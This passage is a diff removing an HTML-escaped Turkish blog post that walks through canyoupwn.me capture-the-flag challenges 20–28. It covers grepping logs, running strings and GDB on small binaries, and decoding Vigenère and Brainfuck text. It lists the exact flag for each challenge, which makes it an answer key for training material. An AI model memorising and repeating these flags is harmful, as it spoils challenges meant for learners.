-github linkine gittiğimizde bizi “relevant” isimli bir dosya bekliyor.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://2.bp.blogspot.com/-pCOUM2Qankg/WSuKMEu4ZoI/AAAAAAAAAkU/nFk8VLiLBgAgW9k8APhunbUcQG-7QybSACLcB/s1600/Screenshot_4.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;460&quot; data-original-width=&quot;1325&quot; height=&quot;111&quot; src=&quot;https://2.bp.blogspot.com/-pCOUM2Qankg/WSuKMEu4ZoI/AAAAAAAAAkU/nFk8VLiLBgAgW9k8APhunbUcQG-7QybSACLcB/s320/Screenshot_4.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
- İçine girdiğimizde ise bizi flagimiz bekliyor. :)&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://2.bp.blogspot.com/-zp7JIf48ADc/WSuKYKJSf8I/AAAAAAAAAkY/Xh6Z9U1Gc4AIrIrSJJHbY4WkNrOJdX6VACLcB/s1600/Screenshot_5.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;502&quot; data-original-width=&quot;1329&quot; height=&quot;120&quot; src=&quot;https://2.bp.blogspot.com/-zp7JIf48ADc/WSuKYKJSf8I/AAAAAAAAAkY/Xh6Z9U1Gc4AIrIrSJJHbY4WkNrOJdX6VACLcB/s320/Screenshot_5.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-20.Sorumuz’un cevabı : cypwn_{easy_peasy_lemon_squeezy}&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://4.bp.blogspot.com/-azMcdXx542Y/WSuPT2PqvCI/AAAAAAAAAks/5kZ-q0md5RQ2BCuhSeUd2HZkXdAR9fKKQCLcB/s1600/Screenshot_6.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;586&quot; data-original-width=&quot;600&quot; height=&quot;312&quot; src=&quot;https://4.bp.blogspot.com/-azMcdXx542Y/WSuPT2PqvCI/AAAAAAAAAks/5kZ-q0md5RQ2BCuhSeUd2HZkXdAR9fKKQCLcB/s320/Screenshot_6.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-21.Sorumuz’a geçelim : Flog&lt;br /&gt;
-&lt;br /&gt;
-İpucumuz : Flag’ı bul&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://2.bp.blogspot.com/-rELaJIcNOGs/WSuPeWFpaWI/AAAAAAAAAkw/j-zQD-7BAGQQ3Ln6kelRK3LrkKJW3SRFQCLcB/s1600/Screenshot_7.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;537&quot; data-original-width=&quot;597&quot; height=&quot;287&quot; src=&quot;https://2.bp.blogspot.com/-rELaJIcNOGs/WSuPeWFpaWI/AAAAAAAAAkw/j-zQD-7BAGQQ3Ln6kelRK3LrkKJW3SRFQCLcB/s320/Screenshot_7.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Bize bir rar dosyası ve içinde “canyoupwnme.log” dosyası veriyor.&lt;br /&gt;
-&lt;br /&gt;
-“canyoupwnme.log” dosyasının içini biraz gezdikten sonra sıkılıp flag değerimizin başı olan “cypwn_{“i aradım ben dosya içinde ve flag’imiz karşımızdaydı :&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-GB1lZ0B5EJg/WSuQIuGPHpI/AAAAAAAAAk4/pcZhubnXPcI3OVM2fkfcoiw44POYNiH6ACLcB/s1600/Screenshot_8.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;512&quot; data-original-width=&quot;1007&quot; height=&quot;162&quot; src=&quot;https://1.bp.blogspot.com/-GB1lZ0B5EJg/WSuQIuGPHpI/AAAAAAAAAk4/pcZhubnXPcI3OVM2fkfcoiw44POYNiH6ACLcB/s320/Screenshot_8.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-21.Sorumuz’un cevabı : cypwn_{canyoupwnme_log}&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://3.bp.blogspot.com/-fq6xZKV8Fzc/WSuQgb2w9fI/AAAAAAAAAk8/3Oc3KvYTprEBMH2groCRf-kSyLL7Lk0uACLcB/s1600/Screenshot_9.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;597&quot; data-original-width=&quot;597&quot; height=&quot;320&quot; src=&quot;https://3.bp.blogspot.com/-fq6xZKV8Fzc/WSuQgb2w9fI/AAAAAAAAAk8/3Oc3KvYTprEBMH2groCRf-kSyLL7Lk0uACLcB/s320/Screenshot_9.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-22.Sorumuz’a geçelim : Rev1&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://3.bp.blogspot.com/-V1reK8X1US4/WSzedLdelzI/AAAAAAAAAlM/pJgPvncE18YRCdpN0rgU-aj8mCis7mHrwCLcB/s1600/Screenshot_1.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;442&quot; data-original-width=&quot;596&quot; height=&quot;237&quot; src=&quot;https://3.bp.blogspot.com/-V1reK8X1US4/WSzedLdelzI/AAAAAAAAAlM/pJgPvncE18YRCdpN0rgU-aj8mCis7mHrwCLcB/s320/Screenshot_1.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Sevdiğim “reverse” sorularına geçtik :D&lt;br /&gt;
-&lt;br /&gt;
-Bu soruda ne kadar derinlere insemde sonum “strings” komutu ile bitti.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-3Gp_eprtlnE/WSze79JNG3I/AAAAAAAAAlU/Io5eYHHwBAYIIBKdEAjTCkspBDh9P5hpACLcB/s1600/Screenshot_1.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;480&quot; data-original-width=&quot;962&quot; height=&quot;159&quot; src=&quot;https://1.bp.blogspot.com/-3Gp_eprtlnE/WSze79JNG3I/AAAAAAAAAlU/Io5eYHHwBAYIIBKdEAjTCkspBDh9P5hpACLcB/s320/Screenshot_1.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Program içindeki stringleri incelediğimizde parola için kullanılan “BATLAMYUS” cevabını görebiliyoruz.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;ol&gt;
-  &lt;li&gt;Sorumuz’un cevabı : cypwn_{BATLAMYUS}&lt;br /&gt;
-&lt;br /&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://3.bp.blogspot.com/-DBlTX1_1nKc/WSzfUaRkH6I/AAAAAAAAAlY/w6Rhi9Oj0DkV7GP9nnVYdHtt7Gvjuz4sgCLcB/s1600/Screenshot_2.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;502&quot; data-original-width=&quot;598&quot; height=&quot;268&quot; src=&quot;https://3.bp.blogspot.com/-DBlTX1_1nKc/WSzfUaRkH6I/AAAAAAAAAlY/w6Rhi9Oj0DkV7GP9nnVYdHtt7Gvjuz4sgCLcB/s320/Screenshot_2.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-23.Sorumuz’a geçelim : Rev2&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-gwko6xIc7Kg/WSzfn7xFhcI/AAAAAAAAAlc/dEOW0skON2IgW3pn7r8s3JEmyVYDzHfRACLcB/s1600/Screenshot_3.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;438&quot; data-original-width=&quot;598&quot; height=&quot;234&quot; src=&quot;https://1.bp.blogspot.com/-gwko6xIc7Kg/WSzfn7xFhcI/AAAAAAAAAlc/dEOW0skON2IgW3pn7r8s3JEmyVYDzHfRACLcB/s320/Screenshot_3.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Bize bir “ELF-32 bit” dosyası veriyor. dosyaya yetkiyi verip açtığımızda bir pincode istiyor bizden.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://2.bp.blogspot.com/-dzqW7YYBCXs/WSzh-q3RY2I/AAAAAAAAAlo/e3y4zxDKb9UvEdpf-aBBhyLjA4XN5sw1QCLcB/s1600/Screenshot_4.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;168&quot; data-original-width=&quot;446&quot; height=&quot;120&quot; src=&quot;https://2.bp.blogspot.com/-dzqW7YYBCXs/WSzh-q3RY2I/AAAAAAAAAlo/e3y4zxDKb9UvEdpf-aBBhyLjA4XN5sw1QCLcB/s320/Screenshot_4.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
- “GDB” debugger’i aracılığıyla bu dosyayı debug ettiğimizde girdiğimiz pinkodumuz’un doğru pinkodumuz ile “cmp” komutu vasıtasıyla karşılaştırıldığını görebiliyoruz.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://4.bp.blogspot.com/-pfZQALCF2xM/WSzlpDwJy1I/AAAAAAAAAmQ/oYPPojU1dzE0lht46eeB318-IokYDB4rACLcB/s1600/Screenshot_7.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;392&quot; data-original-width=&quot;643&quot; height=&quot;195&quot; src=&quot;https://4.bp.blogspot.com/-pfZQALCF2xM/WSzlpDwJy1I/AAAAAAAAAmQ/oYPPojU1dzE0lht46eeB318-IokYDB4rACLcB/s320/Screenshot_7.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-İlerideki yazımda belki “debugger” ve “assembly” olayını biraz daha açabilirim diye düşünüyorum.&lt;br /&gt;
-&lt;br /&gt;
-Çıkan “hexadecimal” değerimiz yani doğru pinkodumuz’u ASCII(text)’e online bir servis aracılığıyla çevirelim.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-QT3-EXSHQwE/WSzmHfJxLyI/AAAAAAAAAmY/rn9inh9HFr0zXqi-mJbtAwcfz3fqB9AggCLcB/s1600/Screenshot_9.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;414&quot; data-original-width=&quot;1158&quot; height=&quot;114&quot; src=&quot;https://1.bp.blogspot.com/-QT3-EXSHQwE/WSzmHfJxLyI/AAAAAAAAAmY/rn9inh9HFr0zXqi-mJbtAwcfz3fqB9AggCLcB/s320/Screenshot_9.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Doğru pinkodum’uz “1423”ü “ELF” dosyamıza deniyelim.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-5DDPtfP5dFM/WSzms29PLCI/AAAAAAAAAmg/AiwsF0_Mdw4dLsJopy5V_rYLLONCB-00ACLcB/s1600/Screenshot_10.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;417&quot; data-original-width=&quot;659&quot; height=&quot;202&quot; src=&quot;https://1.bp.blogspot.com/-5DDPtfP5dFM/WSzms29PLCI/AAAAAAAAAmg/AiwsF0_Mdw4dLsJopy5V_rYLLONCB-00ACLcB/s320/Screenshot_10.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-23.Sorumuz’un cevabı : cypwn_{1423}&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://4.bp.blogspot.com/-eZ0Q7US7O20/WSznkgvY88I/AAAAAAAAAmo/2EUdEZpk66wf3diVOTel28Ss20ajT-ikwCLcB/s1600/Screenshot_11.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;499&quot; data-original-width=&quot;598&quot; height=&quot;267&quot; src=&quot;https://4.bp.blogspot.com/-eZ0Q7US7O20/WSznkgvY88I/AAAAAAAAAmo/2EUdEZpk66wf3diVOTel28Ss20ajT-ikwCLcB/s320/Screenshot_11.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-24.Sorumuz’a geçelim : Rev3&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://4.bp.blogspot.com/-JnBrdlACfio/WSzoQbazdHI/AAAAAAAAAmw/Qix76hXyqjgeSYYacP3cXLGzSg_kRCmTQCLcB/s1600/Screenshot_12.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;437&quot; data-original-width=&quot;598&quot; height=&quot;233&quot; src=&quot;https://4.bp.blogspot.com/-JnBrdlACfio/WSzoQbazdHI/AAAAAAAAAmw/Qix76hXyqjgeSYYacP3cXLGzSg_kRCmTQCLcB/s320/Screenshot_12.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-Bu sorumuz’da yukarıdaki gibi aynı mantıkta.Bizden bir pinkod istiyor.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-1ohLJxGwKPU/WSzosfrqwMI/AAAAAAAAAm0/rFKkxA6ZGvMLwDyeX3BJnSQ2DymLsRXlACLcB/s1600/Screenshot_13.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;390&quot; data-original-width=&quot;648&quot; height=&quot;192&quot; src=&quot;https://1.bp.blogspot.com/-1ohLJxGwKPU/WSzosfrqwMI/AAAAAAAAAm0/rFKkxA6ZGvMLwDyeX3BJnSQ2DymLsRXlACLcB/s320/Screenshot_13.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Değerimizi online bir “hexadecimal to ascii” servisi ile çözdüğümüzde değerimiz “3454” çıkıyor.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-G22QD57zJqc/WSzpMbAyy4I/AAAAAAAAAm8/FQ9obonVpqIy4vDjJUj024hxHBPFRjG3QCLcB/s1600/Screenshot_14.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;413&quot; data-original-width=&quot;659&quot; height=&quot;200&quot; src=&quot;https://1.bp.blogspot.com/-G22QD57zJqc/WSzpMbAyy4I/AAAAAAAAAm8/FQ9obonVpqIy4vDjJUj024hxHBPFRjG3QCLcB/s320/Screenshot_14.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-24.Sorumuz’un cevabı : cypwn_{3454}&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-2LB3GKmcNq4/WSzpcnPIVCI/AAAAAAAAAnA/fiOpHNxEA5wGFcZGgdQIY7JBwODDaADxACLcB/s1600/Screenshot_15.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;501&quot; data-original-width=&quot;597&quot; height=&quot;268&quot; src=&quot;https://1.bp.blogspot.com/-2LB3GKmcNq4/WSzpcnPIVCI/AAAAAAAAAnA/fiOpHNxEA5wGFcZGgdQIY7JBwODDaADxACLcB/s320/Screenshot_15.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-25.Sorumuz’a geçelim : Yeşil Erik&lt;br /&gt;
-&lt;br /&gt;
-İpucumuz : Yeşil eriğin tadı da bir başkadır :) \n bubirsecret&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-feKCQesZ7Ic/WSzs7r3-MOI/AAAAAAAAAnM/-dlX9-eggxonZXQ9HluIKLWFKjdegMRpACLcB/s1600/Screenshot_16.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;471&quot; data-original-width=&quot;597&quot; height=&quot;252&quot; src=&quot;https://1.bp.blogspot.com/-feKCQesZ7Ic/WSzs7r3-MOI/AAAAAAAAAnM/-dlX9-eggxonZXQ9HluIKLWFKjdegMRpACLcB/s320/Screenshot_16.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-Evet arkadaşlar 400 Puanlık uzmanlık sorusu karşınızzdaaa.&lt;br /&gt;
-&lt;br /&gt;
-İnanın ne kadar zor bir soru olarak gelsede size çok kolay.&lt;br /&gt;
-&lt;br /&gt;
-Alt satır’da verilen “bubirsecret” yazısını google’de “intext:bubirsecret” olarak aratınca ilk url’den olayı çözmüş oluyorsunuz tam olarak sayılmasada.&lt;br /&gt;
-&lt;br /&gt;
-intext google’de text aramak için bir method’dur.&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-İlk url’miz olan ekşisözlük forum’una girdiğimiz’de bizi böyle bir sayfa karşılıyor :&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://2.bp.blogspot.com/-paVQc7HU5n4/WSztiU02k5I/AAAAAAAAAnU/JFve3Zl4oB0NNor7bbj99anAg7C2pgx2gCLcB/s1600/Screenshot_18.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;576&quot; data-original-width=&quot;1176&quot; height=&quot;156&quot; src=&quot;https://2.bp.blogspot.com/-paVQc7HU5n4/WSztiU02k5I/AAAAAAAAAnU/JFve3Zl4oB0NNor7bbj99anAg7C2pgx2gCLcB/s320/Screenshot_18.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Buradaki cipher’in “vigenere” olduğunu az çok anlayan olmuştur fakat yanındaki “sır” ne diyecek olursanız bizim anahtarımız.Yanlış duymadınız gerçekten anahtarımız :D&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://2.bp.blogspot.com/-rWmyLVYDRsY/WSzt9Hw1ulI/AAAAAAAAAnY/XoinamH7vu8JAa0q7IHZdmzAFR2FEfoQQCLcB/s1600/Screenshot_20.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;509&quot; data-original-width=&quot;984&quot; height=&quot;165&quot; src=&quot;https://2.bp.blogspot.com/-rWmyLVYDRsY/WSzt9Hw1ulI/AAAAAAAAAnY/XoinamH7vu8JAa0q7IHZdmzAFR2FEfoQQCLcB/s320/Screenshot_20.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-cipher’imiz olarak bulduğumuz articlede’ki “vcpkmjauzczzhbfdwaa”yı kullandığımızda ve anahtar’a “Bakınız : sır” köşesindeki sır’ı yazdığımızda flag’imizi bulmuş oluyoruz.&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;ol&gt;
-  &lt;li&gt;Sorumuz’un cevabı : cypwn_{duysesimikriptoloji}&lt;br /&gt;
-&lt;br /&gt;&lt;/li&gt;
-&lt;/ol&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-UVNIcj772FQ/WSzucRxjgpI/AAAAAAAAAng/bTXdFC7osw4p93v_m15THhNElMpTAJNqQCLcB/s1600/Screenshot_21.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;527&quot; data-original-width=&quot;593&quot; height=&quot;284&quot; src=&quot;https://1.bp.blogspot.com/-UVNIcj772FQ/WSzucRxjgpI/AAAAAAAAAng/bTXdFC7osw4p93v_m15THhNElMpTAJNqQCLcB/s320/Screenshot_21.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-26.Sorumuz’a geçelim : This is LEAK!&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://3.bp.blogspot.com/-Q3p3Qtdi71I/WS4OcUv9ByI/AAAAAAAAAnw/_h2Ug3Oam6cQGtkW7DMjBhevxertPm_3ACLcB/s1600/Screenshot_1.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;486&quot; data-original-width=&quot;598&quot; height=&quot;260&quot; src=&quot;https://3.bp.blogspot.com/-Q3p3Qtdi71I/WS4OcUv9ByI/AAAAAAAAAnw/_h2Ug3Oam6cQGtkW7DMjBhevxertPm_3ACLcB/s320/Screenshot_1.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-Bu soru cidden çok alakasızdı fotoraf ile.&lt;br /&gt;
-&lt;br /&gt;
-Soru’nun cevabı şansımın yaver gitmesi oldu.&lt;br /&gt;
-&lt;br /&gt;
-Canyoupwn.me sitesini gezinirken “WebRTC IP Leak” isimli bir post’a denk geldim.&lt;br /&gt;
-&lt;br /&gt;
-Cevap olarak konu başlığındaki herşeyi denedim “WebRTC_IP_Leak” olsun “IP” olsun.Sonunda sorunun cevabını “webrtc” olarak buldum.&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-26.Sorumuz’un cevabı : cypwn_{webrtc}&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-k_gtLPe3xcY/WS4PWjVDeQI/AAAAAAAAAn4/kghcyTbKdmAAF20xUj5_XTl14Sls0zVVACLcB/s1600/Screenshot_2.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;488&quot; data-original-width=&quot;599&quot; height=&quot;260&quot; src=&quot;https://1.bp.blogspot.com/-k_gtLPe3xcY/WS4PWjVDeQI/AAAAAAAAAn4/kghcyTbKdmAAF20xUj5_XTl14Sls0zVVACLcB/s320/Screenshot_2.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-27.Sorumuz’a geçelim : Sen Görürsün Sevgilim&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://2.bp.blogspot.com/-W0uYKBEazak/WS4PprW0vFI/AAAAAAAAAn8/Soukdke_P3oulYWqXuFDnSepDs8u9FeEQCLcB/s1600/Screenshot_3.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;509&quot; data-original-width=&quot;600&quot; height=&quot;270&quot; src=&quot;https://2.bp.blogspot.com/-W0uYKBEazak/WS4PprW0vFI/AAAAAAAAAn8/Soukdke_P3oulYWqXuFDnSepDs8u9FeEQCLcB/s320/Screenshot_3.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-Soru’da verilen yazının açıkca “BrainFuck” olduğu görünebiliyordu online bir brainfuck to text sitesinde sorumuz’un cevabını bulduk.&lt;br /&gt;
-&lt;br /&gt;
-27.Sorumuz’un cevabı : cypwn_{sokrates}&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://1.bp.blogspot.com/-RkhS6xAfDvw/WS4QIwyQABI/AAAAAAAAAoE/EB2M65wg6dgftjwLtbw4tRyhSjF97BhJQCLcB/s1600/Screenshot_4.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;505&quot; data-original-width=&quot;598&quot; height=&quot;270&quot; src=&quot;https://1.bp.blogspot.com/-RkhS6xAfDvw/WS4QIwyQABI/AAAAAAAAAoE/EB2M65wg6dgftjwLtbw4tRyhSjF97BhJQCLcB/s320/Screenshot_4.png&quot; width=&quot;320&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-28.Sorumuz’a geçelim : Sevgilimden Trip Yedim Ne Diyo bu ya?&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
